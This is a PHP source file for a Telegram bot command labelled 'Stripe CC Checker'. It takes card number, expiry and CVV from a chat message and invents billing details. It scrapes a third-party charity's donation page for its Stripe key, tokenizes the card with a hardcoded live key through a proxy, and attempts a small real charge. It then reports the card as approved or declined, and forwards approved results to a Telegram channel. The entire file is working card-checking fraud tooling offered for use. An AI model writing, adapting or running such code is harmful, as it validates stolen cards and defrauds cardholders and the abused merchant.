<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/

$gateway = "Stripe Charge";
$check_type = "CVV";
$dir = dirname(__dir__,2);
include($dir."/config/config.php");
include($dir."/config/variables.php");
include_once($dir."/functions/bot.php");
include_once($dir."/functions/db.php");
include_once($dir."/functions/functions.php");
////////////====[MUTE]====////////////
 $time_start = microtime(true);
$cookie = RandomString();
if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0 || strpos($message, ".ss ") === 0){

//
//    $trans_completed = false;
//    $tries = 0;
//    $limit = 1;
//    while ($trans_completed == false && $tries < $limit ) {
//        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == "no"){
          bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
          ]);
          return;

        }else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

            ]);

            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);


  if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $yy1 = substr($yy, 2, 2);
                $bin = substr($cc, 0, 6);
                $cbin = substr($cc, 0, 1);
                ###CHECKER PART###
                $binlist = json_decode(fbankinfo($bin),true);
                $ccbank = $binlist['Bank'];
                $ccvendor = $binlist['Vendor'];
                $cctype = $binlist['Bank_Info'];
                $cc_country = $binlist['Country'];
                $abn = $binlist['Abn'];
                $cc_emoji = $binlist['emoji'];



                $info = json_decode(random_info(),true);
                $fname = $info['fname'];
                $lname = $info['lname'];
                $email = $info['email'];
                $street = $info['street'];
                $city = $info['city'];
                $state = $info['state'];
                $phone = $info['phone'];
                $postcode = $info['postcode'];
                ###CHECKER PART###
                $zip = rand(90010,94000);
                if($cbin == 5){
                    $ctype = 'MasterCard';
                }
                else if($cbin == 4){
                    $ctype = 'Visa';
                }
                $Amount = 0.8;

      $cookie = RandomString();
      $str = substr(randomString(), 0, 7);
      $page =  cURL(
          "https://mrcssi.com/asp-products/donate-now/",
          $headers = [
              'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
              'user-agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
          ],
          "",
          "GET",
          1,
          $cookie
      );  $buttonkey = GetStr($page, "stripeButtonKey' value='", "'");
//  $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

      $get_id =  cURL(
          "https://m.stripe.com/6",
          $headers = [
              'accept: */*',
              'content-type: text/plain;charset=UTF-8',
              'origin: https://m.stripe.network',
              'referer: https://m.stripe.network/',
              'user-agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
          ],
          "",
          "POST",
          1,
          $cookie
      );
      $muid =  GetStr($get_id, '"muid":"', '"');
      $guid = GetStr($get_id, '"guid":"', '"');
      $sid = GetStr($get_id, '"sid":"', '"');
      if (empty($guid)) {
          $guid = "N/A";
      }
      if (empty($muid)) {
          $muid = "N/A";
      }
      if (empty($sid)) {
          $sid = "N/A";
      }


      $token_method =  cURL_ProxyOn(
          "https://api.stripe.com/v1/tokens",
          $headers = [
              "accept: application/json",
              "content-type: application/x-www-form-urlencoded",
              "origin: https://js.stripe.com",
              "referer: https://js.stripe.com/",
              'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
          ],
          "email=$str%40aol.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F78ef418)&referrer=https%3A%2F%2Fmrcssi.com%2Fasp-products%2Fdonate-now%2F&time_checkout_opened=1655196722&time_checkout_loaded=1655196721&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=".ltrim($mm,0)."&card[exp_year]=$yy&card[name]=$str%40aol.com&card[address_zip]=".rand(91000,94000)."&time_on_page=9633&guid=$guid&muid=$muid&sid=$sid&key=pk_live_mgHKSEMwFO4XjzSgv6U2yutK",
          "POST",
          1,
          $cookie
      ); $token = GetStr($token_method, '"id": "', '"');
      if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {

          $ajax_confirm =  cURL_ProxyOn(
              "https://mrcssi.com/asp-products/donate-now/",
              $headers = [
                  "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                  "content-type: application/x-www-form-urlencoded",
                  "referer: https://mrcssi.com/asp-products/donate-now/",
                  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
              ],
              'stripeAmount=1.00&stripeProductId=1708&stripeToken='.$token.'&stripeTokenType=card&stripeEmail='.$str.'%40aol.com&stripeButtonKey='.$buttonkey.'&stripeItemPrice=0&stripeTax=0&stripeShipping=0&stripeItemCost=0&asp_action=process_ipn&item_name=Donate+Now%21&item_quantity=1&currency_code=CAD&item_url=&thankyou_page_url=&charge_description=&stripeBillingName=Marsh+Gamboa&stripeBillingAddressLine1=2380+College+Street&stripeBillingAddressZip='.rand(91000,94000).'&stripeBillingAddressCity=Norcross&stripeBillingAddressCountry=Canada&stripeBillingAddressCountryCode=CA&clickProcessed=1',
              "POST",
              1,
              $cookie
          );


          $response = GetStr($ajax_confirm, 'System was not able to complete the payment.','.');
      }else{
          $response = GetStr($token_method, '"message": "','"');
      }
      $time = number_format(microtime(true) - $time_start, 2);
      if (strpos($ajax_confirm, 'Thank you for your payment.')){
                    addTotal();
                    addUserTotal($userId);
                    addCVV();
                    addUserCVV($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>APPROVED ✅
<b>Card -»</b> <code>$lista</code>
Response -» Approved
Type -» $check_type 
Gateway -» $gateway $ 1
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'

                ]);$trans_completed = true;copyLogs("@payamansoyccn",$chat_id,$messageidtoedit);
      } elseif (strpos($ajax_confirm, 'System was not able to complete the payment.')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response
Type -» $check_type 
Gateway -» $gateway 
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'

                ]);$trans_completed = true;
            } else {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response
Type -» $check_type 
Gateway -» $gateway 
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'

                ]);$trans_completed = true;
            }

        } else {
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
               'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);
            }
        }$trans_completed = true;


}


?>
